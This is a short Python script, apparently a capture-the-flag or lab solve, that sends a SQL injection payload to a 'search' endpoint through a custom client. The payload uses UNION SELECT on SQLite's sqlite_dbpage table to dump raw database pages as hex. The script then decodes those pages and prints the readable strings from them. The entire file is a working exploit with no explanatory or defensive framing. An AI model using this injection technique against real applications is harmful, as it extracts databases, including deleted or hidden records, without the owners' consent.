from client import GhostClient
import re

c = GhostClient()
c.bootstrap()

res = c.request("search", {"q": "' UNION SELECT 1, cast(pgno as text), hex(data) FROM sqlite_dbpage--"}).get("data", {}).get("rows", [])

for r in res:
    if r["id"] == 1:
        pg_no = r["title"]
        hex_str = r["summary"]
        print(f"=== PAGE {pg_no} ({len(hex_str)//2} bytes) ===")
        try:
            raw = bytes.fromhex(hex_str)
            strs = re.findall(b'[\x20-\x7e]{3,}', raw)
            for s in strs:
                print(" ", s.decode('ascii'))
        except Exception as e:
            print("  Error:", e)
